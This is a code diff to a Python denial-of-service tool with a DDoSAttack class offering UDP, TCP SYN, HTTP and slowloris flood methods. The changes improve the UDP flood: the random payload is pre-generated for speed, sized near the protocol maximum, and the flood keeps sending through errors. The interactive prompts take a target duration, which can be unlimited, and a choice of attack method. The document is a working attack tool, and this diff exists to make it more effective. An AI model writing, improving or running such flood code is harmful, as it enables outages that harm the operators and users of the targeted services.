@@ -237,10 +237,18 @@ class DDoSAttack:
         self.rotator = rotator or UserAgentRotator()
 
     def udp_flood(self):
+        # UDP max payload is ~65507 bytes, but we limit to safe size
+        max_udp_size = 60000
+        payload_size = min(self.byte_size, max_udp_size)
+
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
+        # Pre-generate payload for better performance
+        payload = bytes(random.getrandbits(8) for _ in range(payload_size))
+
         sent = 0
+        errors = 0
         while self.running:
             if self.duration > 0 and (time.time() - self.start_time) >= self.duration:
                 break
@@ -250,16 +258,19 @@ class DDoSAttack:
                         break
                     self.request_counter += 1
             try:
-                payload = bytes(random.getrandbits(8) for _ in range(self.byte_size))
                 sock.sendto(payload, (self.target, self.port))
                 sent += 1
                 if sent % 10000 == 0:
                     print(f"[UDP-{threading.current_thread().name}] Sent {sent} packets")
             except Exception as e:
-                print(f"[UDP-{threading.current_thread().name}] Error: {e}")
-                break
+                errors += 1
+                if errors > 100:
+                    print(f"[UDP-{threading.current_thread().name}] Too many errors, stopping")
+                    break
+                # Small delay on error to avoid tight loop
+                time.sleep(0.01)
         sock.close()
-        print(f"[UDP-{threading.current_thread().name}] Finished - sent {sent} packets")
+        print(f"[UDP-{threading.current_thread().name}] Finished - sent {sent} packets, errors: {errors}")
 
     def tcp_syn_flood(self):
         sent = 0
@@ -427,7 +438,7 @@ def main():
         duration = int(input("Enter duration in seconds (0 for unlimited): ").strip())
         print(f"[5] Duration: {duration}")
 
-        byte_size = int(input("Enter payload size in bytes: ").strip())
+        byte_size = int(input("Enter payload size in bytes (max 60000 for UDP): ").strip())
         print(f"[6] Byte size: {byte_size}")
 
         method = input("Enter attack method (udp/tcp/http/slowloris): ").strip().lower()
